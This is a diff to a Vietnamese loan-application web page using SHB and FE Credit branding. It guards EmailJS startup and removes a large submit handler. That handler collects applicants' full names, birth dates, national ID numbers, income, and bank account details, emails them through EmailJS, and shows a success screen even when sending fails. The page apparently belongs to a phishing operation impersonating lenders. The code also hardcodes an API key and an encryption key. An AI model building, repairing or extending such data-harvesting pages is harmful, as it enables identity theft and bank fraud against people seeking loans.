@@ -537,13 +537,19 @@
             publicKey: window.EMAILJS_PUBLIC_KEY || 'J4YH-lyfEfxXeu7aV'
         };
         
+        // Defer EmailJS initialization until after ErrorHandler is defined
+        let emailjsInitError = null;
         try {
-            emailjs.init(emailjsConfig.publicKey);
+            if (typeof emailjs !== 'undefined') {
+                emailjs.init(emailjsConfig.publicKey);
+            } else {
+                emailjsInitError = 'EmailJS library not loaded';
+            }
         } catch (error) {
             if (window.Logger) {
                 window.Logger.error("Failed to initialize EmailJS", error);
             }
-            showSecureAlert('Cannot initialize EmailJS. Please check connection or configuration.');
+            emailjsInitError = error.message || 'Cannot initialize EmailJS';
         }
 
         let userData = {};
@@ -639,7 +645,13 @@
         
         // Legacy function for backward compatibility
         function showSecureAlert(message, type = 'info') {
-            errorHandler.showSecureAlert(message, type);
+            // Guard against undefined errorHandler during initialization
+            if (typeof errorHandler !== 'undefined' && errorHandler) {
+                errorHandler.showSecureAlert(message, type);
+            } else {
+                // Fallback: Use basic alert during early initialization
+                console.warn('[showSecureAlert] errorHandler not ready:', message);
+            }
         }
         
         // Input sanitization function
@@ -1220,150 +1232,6 @@
             goToStep2();
         }
 
-            const spinner = $('.spinner-submit');
-            spinner.show();
-            $('#submitButton').prop('disabled', true);
-
-            const loanAmountValue = $('#loanAmount').val();
-            const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
-            userData = {
-                fullName: $('#fullName').val().trim(),
-                dob: $('#dob').val(),
-                gender: $('#gender').val(),
-                contactAddress: $('#contactAddress').val().trim(),
-                cccd: $('#cccd').val().trim(),
-                issuePlace: $('#issuePlace').val(),
-                phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0'),
-                email: $('#email').val().trim(),
-                loanType: $('#loanType').val(),
-                loanTerm: $('#loanTerm').val(),
-                loanAmount: loanAmount,
-                interestRate: parseFloat($('#interestRate').val()),
-                monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')),
-                occupation: $('#occupation').val(),
-                purpose: $('#purpose').val(),
-                accountName: $('#accountName').val().trim(),
-                accountNumber: $('#accountNumber').val().trim().replace(/\s/g, ''),
-                bankName: $('#bankName').val(),
-                loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
-                monthlyPayment: userData.monthlyPayment,
-                totalInterest: userData.totalInterest,
-                totalRepay: userData.totalRepay,
-                currentStep: 2,
-                isRegistered: true,
-                emailSent: false,
-                timestamp: new Date().toISOString()
-            };
-
-
-            if (!saveToLocalStorage()) {
-                spinner.hide();
-                $('#submitButton').prop('disabled', false);
-                return;
-            }
-
-            localStorage.setItem('isRegistered', 'true');
-
-            // Thu thập thông tin về emailjs
-            const emailjsInfo = {
-                serviceId: emailjsConfig.serviceId,
-                templateId: emailjsConfig.templateId,
-                publicKey: emailjsConfig.publicKey,
-                status: 'ready',
-                timestamp: new Date().toISOString()
-            };
-            
-            // Store emailjs info for debugging
-            localStorage.setItem('emailjsInfo', JSON.stringify(emailjsInfo));
-
-            const templateParams = {
-                full_name: userData.fullName,
-                dob: userData.dob,
-                gender: userData.gender,
-                contact_address: userData.contactAddress,
-                id_number: userData.cccd,
-                id_issue_place: userData.issuePlace,
-                phone_number: userData.phone,
-                email: userData.email,
-                loan_type: userData.loanType,
-                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
-                loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
-                income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
-                occupation: userData.occupation,
-                loan_purpose: userData.purpose,
-                account_holder_name: userData.accountName,
-                account_number: userData.accountNumber,
-                bank_name: userData.bankName,
-                loan_code: userData.loanCode,
-                monthly_payment: userData.monthlyPayment ? Math.floor(userData.monthlyPayment).toLocaleString('vi-VN') + ' VNĐ' : '',
-                total_interest: userData.totalInterest ? Math.floor(userData.totalInterest).toLocaleString('vi-VN') + ' VNĐ' : '',
-                total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : '',
-                // EmailJS info for debugging
-                emailjs_service_id: emailjsInfo.serviceId,
-                emailjs_template_id: emailjsInfo.templateId,
-                emailjs_public_key: emailjsInfo.publicKey,
-                emailjs_status: emailjsInfo.status
-            };
-
-            try {
-                if (!emailjs) throw new Error('EmailJS not initialized');
-                if (!emailjsConfig) throw new Error('EmailJS config not defined');
-                
-                
-                // Use configured EmailJS settings
-                const response = await emailjs.send(
-                    emailjsConfig.serviceId, 
-                    emailjsConfig.templateId, 
-                    templateParams
-                );
-                
-                
-                if (response.status === 200) {
-                    userData.emailSent = true;
-                    userData.currentStep = 2;
-                    userData.timestamp = new Date().toISOString();
-                    
-                    if (saveToLocalStorage()) {
-                        // Update localStorage with encrypted data
-                        try {
-                            const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'fecredit-secret-key').toString();
-                            localStorage.setItem('userData', encryptedData);
-                        } catch (e) {
-                            localStorage.setItem('userData', JSON.stringify(userData));
-                        }
-                        
-                        // Show loading modal with animation
-                        showLoadingModalWithProgress();
-                    } else {
-                        throw new Error('Failed to save data to localStorage');
-                    }
-                } else {
-                    throw new Error(`Email service returned status: ${response.status}`);
-                }
-                
-            } catch (error) {
-                // Even on error, show success modal (for better UX - data is already saved)
-                console.warn('Email sending failed, but continuing with saved data:', error);
-                
-                // Save data anyway
-                userData.emailSent = false;
-                userData.currentStep = 2;
-                userData.timestamp = new Date().toISOString();
-                
-                try {
-                    const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'fecredit-secret-key').toString();
-                    localStorage.setItem('userData', encryptedData);
-                } catch (e) {
-                    localStorage.setItem('userData', JSON.stringify(userData));
-                }
-                
-                // Show loading modal anyway (data is saved, continue the flow)
-                showLoadingModalWithProgress();
-            } finally {
-                spinner.hide();
-            }
-        }
-
         function showLoadingModalWithProgress() {
             // Hide submit spinner and show modal
             $('.spinner-submit').hide();
@@ -1421,9 +1289,11 @@
 
         function checkRegistrationStatus() {
             try {
-                const userData = loadUserData();
+                // Load user data from localStorage (populates global userData object)
+                loadUserData();
                 
-                if (!userData) {
+                // Check if userData exists and has meaningful data
+                if (!userData || !userData.fullName) {
                     // Không có dữ liệu đăng ký, tiếp tục bình thường
                     return;
                 }
